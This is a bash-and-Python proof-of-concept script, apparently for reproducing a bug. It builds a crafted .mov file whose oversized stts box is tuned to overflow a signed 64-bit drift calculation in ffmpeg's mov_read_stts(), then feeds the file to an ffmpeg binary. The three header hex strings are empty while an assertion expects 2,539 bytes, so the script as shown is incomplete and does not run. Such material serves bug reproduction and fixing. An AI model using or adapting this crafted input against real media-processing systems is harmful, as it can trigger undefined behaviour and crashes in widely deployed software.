#!/bin/bash
# Generates a crafted .mov file that triggers a signed-integer-overflow
# in mov_read_stts()'s drift calculation (current_dts - corrected_dts),
# then feeds it to the target ffmpeg binary.
set -e
python3 - <<'PYEOF'
import struct

# Bytes 0..900 of a minimal ffmpeg-muxed .mov (ftyp/wide/mdat/moov start)
HDR1 = ""
# Bytes 900..1800
HDR2 = ""
# Bytes 1800..2539 (contains moov/trak/mdia/minf/stbl size fields, unpatched)
HDR3 = ""
# Bytes 2563..2704: stss/stsc/stsz/stco/udta, unchanged tail after the old (24-byte) stts box
TAIL = "00000014737473730000000000000001000000010000001c737473630000000000000001000000010000000500000001000000287374737a0000000000000000000000050000049700000087000000af000000af000000b0000000147374636f000000000000000100000024000000217564746100000019a9737772000d55c44c61766635392e31322e313030"

header = bytes.fromhex(HDR1 + HDR2 + HDR3)
tail = bytes.fromhex(TAIL)
assert len(header) == 2539
assert len(tail) == 141

full_k = 480000            # magnitude of the "drift correction" (max allowed by
                            # default max_stts_delta = UINT_MAX-480000)
full_sc = 4294967295       # sample_count = UINT32_MAX
dur_full = (2**32 - full_k)  # sample_duration cast to int32 => -480000

entries = [(full_sc, dur_full)] * 4473
entries.append((3969678745, dur_full))  # final tuning entry -> pushes
                                         # (current_dts - corrected_dts) past INT64_MAX
body = b"".join(struct.pack(">II", sc, dur) for sc, dur in entries)
entry_count = len(entries)
new_stts = struct.pack(">I4sII", 8 + 8 + len(body), b"stts", 0, entry_count) + body

old_off = 2539
old_size = 24
delta = len(new_stts) - old_size

data = bytearray(header)
for off in (1872, 1988, 2124, 2209, 2317):  # moov, trak, mdia, minf, stbl
    sz = int.from_bytes(data[off:off + 4], "big")
    data[off:off + 4] = struct.pack(">I", sz + delta)

final = bytes(data) + new_stts + tail
with open("/tmp/poc.mov", "wb") as f:
    f.write(final)
print("wrote /tmp/poc.mov: %d bytes, %d stts entries" % (len(final), entry_count))
PYEOF

/work/ffmpeg -v error -i /tmp/poc.mov -f null - 
echo "ffmpeg exit code: $?"
